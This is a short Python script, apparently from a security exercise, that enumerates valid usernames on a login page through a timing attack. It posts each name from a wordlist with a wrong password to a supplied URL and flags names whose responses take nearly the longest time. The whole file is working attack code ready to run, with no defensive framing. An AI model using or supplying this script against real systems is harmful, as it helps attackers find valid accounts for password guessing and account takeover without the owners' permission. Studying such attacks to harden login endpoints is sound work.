# User enumeration via timing attack

import argparse
import requests
import json
import time as t


# Get the url and wordlist from the user
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL of the login page", required=True)
parser.add_argument("-w", "--wordlist", help="Wordlist of usernames", required=True)
args = parser.parse_args()

def login(username):
    data = {"username": username, "password": "invalidPassword"}
    response = requests.post(args.url, json=data)
    
    if response.status_code != 200:  
        print("IP entered was invalid", response.status_code)

def check_times(times):
    longest_time = max(times.values())

    for user, time in times.items():
        if time >= longest_time * 0.9:
            print("Found valid user: " + user)

def main():
    usernames = []
    with open(args.wordlist, "r") as names_list:
        for line in names_list:
            usernames.append(line.replace("\n", ""))

    times = dict()
    for username in usernames:
        print("Trying user: " + username.strip())

        start = t.time()
        login(username)
        end = t.time()

        times[username] = end - start
        t.sleep(0.01)  # Sleep to avoid DoS

    check_times(times)

main()


# Saskia Lablans
